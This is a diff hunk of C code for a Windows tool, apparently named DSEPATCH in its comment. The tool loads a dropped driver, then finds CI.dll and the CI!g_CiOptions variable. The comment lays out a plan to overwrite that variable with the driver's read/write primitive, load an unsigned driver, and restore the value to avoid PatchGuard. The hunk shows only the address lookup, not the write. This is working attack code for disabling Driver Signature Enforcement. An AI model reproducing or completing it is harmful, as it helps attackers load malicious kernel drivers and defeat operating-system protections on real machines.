@@ -31,7 +31,32 @@ int main(int argc, char **argv)
     ); DumpToFile(szDriverPath);
 
     if ( (DriverLoaded = LoadDriver(szDriverPath)) ) {
+      /*!
+       * At this point, DSEPATCH (c) is able to use
+       * its read / write primitive to overwrite the
+       * CI!g_CiOptions variable to load an unsigned
+       * driver.
+       *
+       * We will read the current value (probably 0x6),
+       * trigger the write with 0x1, load the driver,
+       * and rewrite the variable once again to avoid
+       * trigger PatchGuard.
+      !*/
+      ULONG32 Ci_gOptions_n = 0;
+      ULONG32 Ci_gOptions_o = 0;
+      LPVOID  Ci_MemoryBase = 0;
+      LPVOID  Ci_PtrOptions = 0;
+      
       printf("[+] %s loaded successfully\n", szDriverPath);
+
+      Ci_MemoryBase = GetDrvBase("CI.dll");
+
+      printf("[+] CI.DLL @ %p\n", Ci_MemoryBase);
+
+      Ci_PtrOptions = GetCiOptions1(Ci_MemoryBase);
+
+      printf("[+] CI!g_CiOptions @ %p\n", Ci_PtrOptions);
+
     } else { printf("[ ] LoadDriver 0x%x\n", GetLastError()); };
   };
 
